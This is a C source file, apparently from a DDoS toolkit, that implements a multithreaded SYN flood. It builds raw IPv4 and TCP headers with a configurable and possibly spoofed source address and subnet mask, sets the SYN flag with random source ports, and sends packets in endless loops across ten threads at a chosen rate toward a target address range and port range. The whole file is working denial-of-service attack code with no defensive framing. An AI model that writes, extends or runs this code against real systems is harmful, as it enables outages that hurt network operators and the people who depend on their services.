#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/syn_flood.h"

// session counting
unsigned int g_syn_num_total;
unsigned long g_syn_num_generated_in_sec;
// from main()
char g_syn_dest_ip[16];
char g_syn_src_ip[16];
unsigned int g_syn_src_mask;
unsigned int g_syn_dest_mask;
unsigned int g_syn_dest_port_start;
unsigned int g_syn_dest_port_end;
unsigned int g_syn_request_per_sec;
// for masking next ip address
char g_syn_now_src_ip[16];
char g_syn_now_dest_ip[16];
unsigned int g_syn_now_dest_port;
// thread
pthread_mutex_t g_syn_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_syn_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_syn_before_time;
struct timespec g_syn_now_time;

void syn_flood_print_usage(void)
{
	printf("SYN flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
	return;
}

void *generate_syn_flood(void *data)
{
	srand(time(NULL));
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	clock_t thread_clock;
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_syn_mutex);
		// get now resource
		generator(g_syn_src_ip,
			g_syn_dest_ip,
			g_syn_src_mask,
			g_syn_dest_mask,
			g_syn_dest_port_start,
			g_syn_dest_port_end,
			g_syn_now_src_ip,
			g_syn_now_dest_ip,
			&g_syn_now_dest_port);
		// make ipv4 header
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(g_syn_src_ip));
		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(g_syn_dest_ip));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct tcphdr));
		// make tcp header.
		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		// set src port number random
		tcp_h = tcp_set_source(tcp_h, rand() % 65535 + 1);
		tcp_h = tcp_set_dest(tcp_h, g_syn_now_dest_port);
		tcp_h = tcp_set_seq(tcp_h, g_syn_num_total);
		// ***For SYN TCP request, ACK seq should not be provided
		// tcp_h = tcp_set_ack_seq(tcp_h,35623);
		tcp_h = tcp_set_syn_flag(tcp_h);
		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, NULL, 0);
		// wait a second
		if (g_syn_num_generated_in_sec >= g_syn_request_per_sec) {
			pthread_cond_wait(&g_syn_cond, &g_syn_mutex);
		}
		// time checking
		time_check(&g_syn_mutex, &g_syn_cond, &g_syn_before_time, &g_syn_now_time, &g_syn_num_generated_in_sec);
		// make and send packet
		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
		send_packet(sock, ipv4_h, packet, g_syn_now_dest_port);
		free(packet);
		g_syn_num_generated_in_sec++;
		g_syn_num_total++;
		// *** end of critical section ***
		pthread_mutex_unlock(&g_syn_mutex);
	}
	close(sock);
	return 0;
}

void *syn_flood_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_syn_mutex);
		time_check(&g_syn_mutex, &g_syn_cond, &g_syn_before_time, &g_syn_now_time, &g_syn_num_generated_in_sec);
		pthread_mutex_unlock(&g_syn_mutex);
	}
}

void syn_flood_main(char *argv[])
{
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		syn_flood_print_usage();
		return;
	}
	// get ip address, mask, port
	split_ip_mask_port(argv,
			g_syn_src_ip,
			g_syn_dest_ip,
			&g_syn_src_mask,
			&g_syn_dest_mask,
			&g_syn_dest_port_start,
			&g_syn_dest_port_end);
	g_syn_num_generated_in_sec = 0;
	g_syn_num_total = 0;
	memset(&g_syn_before_time, 0, sizeof(struct timespec));
	memset(&g_syn_now_time, 0, sizeof(struct timespec));
	g_syn_request_per_sec = atoi(argv[3]);
	const int num_threads = 10;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Sending SYN requests to %s using %d threads\n", g_syn_dest_ip, num_threads);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(&threads[i], NULL, generate_syn_flood, (void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, syn_flood_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("thread %d joined\n", i);
	}
	pthread_mutex_destroy(&g_syn_mutex);
	printf("SYN flood finished\nTotal %d packets sent.\n", g_syn_num_total);
	pthread_exit(NULL);
	return;
}